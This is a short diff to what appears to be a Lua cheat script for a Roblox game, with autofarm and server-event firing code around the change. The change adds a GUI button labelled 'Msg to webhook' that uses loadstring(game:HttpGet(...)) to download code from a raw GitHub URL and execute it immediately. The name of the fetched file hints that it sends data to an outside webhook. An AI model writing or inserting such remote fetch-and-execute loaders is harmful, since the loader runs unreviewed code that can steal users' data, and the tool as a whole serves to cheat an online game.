@@ -1990,6 +1990,9 @@ game:GetService("ReplicatedStorage").Events.blast:FireServer(unpack(args))
 end
 end)
 
+Guis:Button("Msg to webhook", function() -- This is A Button
+loadstring(game:HttpGet('https://raw.githubusercontent.com/clickclickpow/pls/main/robloxtoweb'))()
+end)
 
 Autofarm:Label("Hello") -- This is just for information or Text ;)
 
